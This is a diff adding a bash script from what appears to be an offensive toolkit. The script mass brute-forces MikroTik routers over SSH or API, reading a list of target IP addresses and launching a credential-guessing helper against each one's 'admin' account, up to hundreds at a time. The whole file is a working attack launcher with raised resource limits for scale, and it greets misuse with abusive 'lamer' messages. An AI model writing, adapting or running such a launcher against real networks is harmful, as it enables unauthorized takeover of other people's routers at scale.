@@ -1,0 +1,97 @@
+#!/bin/bash
+
+ulimit -n 31337
+ulimit -i unlimited
+ulimit -e unlimited
+ulimit -l unlimited
+ulimit -q unlimited
+ulimit -s unlimited
+ulimit -u unlimited
+
+if [ $# -lt 2 ]; then
+	echo "usage:"
+	echo " -a <api brute force> (no default      )"
+	echo " -s <ssh brute force> (no default      )"
+	echo " -i <ips file>        (required        )"
+	echo " -t <connect timeout> (defaults to: 5  )"
+	echo " -p <process number>  (defaults to: 100)"
+	exit 0
+fi
+
+: ${A_FLAG:="0"}
+: ${S_FLAG:="0"}
+: ${I_FLAG:="0"}
+: ${T_FLAG:="0"}
+: ${P_FLAG:="0"}
+: ${ND:=0}
+
+while getopts "i:t:p:as" OPTION
+do
+	case $OPTION in
+		a)
+			A_FLAG="1"
+			;;
+		s)
+			S_FLAG="1"
+			;;
+		i)
+			I_FLAG="1"
+			I_OPT="$OPTARG"
+			;;
+		t)
+			T_FLAG="1"
+			T_OPT="$OPTARG"
+			;;
+		p)
+			P_FLAG="1"
+			P_OPT="$OPTARG"
+			;;
+		?)
+			exit 1
+			;;
+	esac
+done
+
+if [ ${T_FLAG} == 0 ]; then
+    T_OPT="3"
+fi
+
+if [ ${P_FLAG} == 0 ]; then
+    P_OPT="100"
+fi
+
+function brute {
+	DPROGRESS=`wc -l ${I_OPT} | awk '{ print $1 }'`
+	while read line; do
+		if [ "${1}" == "api" ]; then
+			#./.timeout ${T_OPT} changers/mikrotik/api -l logs/mk.log $line &
+			./.timeout ${T_OPT} changers/mikrotik/ssh -h $line -P 22 -u admin &
+		elif [ "${1}" == "ssh" ]; then
+			./.timeout ${T_OPT} changers/mikrotik/ssh -h $line -P 22 -u admin &
+		fi
+		if (( $(($((++ND)) % ${P_OPT} )) == 0 )) ; then
+			wait
+		fi
+		DPROGRESS=$(( $DPROGRESS - 1 ))
+	done < ${I_OPT}
+	wait $!
+	sleep 2
+}
+
+if [ "${I_FLAG}" == 0 ]; then
+	echo "[!] are you a fucking lamer?"
+	exit 0
+fi
+
+if [ ${A_FLAG} == 1 ] && [ ${S_FLAG} == 1 ]; then
+	echo "[!] are you a fucking lamer?"
+	exit 0
+fi
+
+if [ ${A_FLAG} == 1 ]; then
+	BMETHOD="api"
+elif [ ${S_FLAG} == 1 ]; then
+	BMETHOD="ssh"
+fi
+
+brute ${BMETHOD} ${I_OPT}
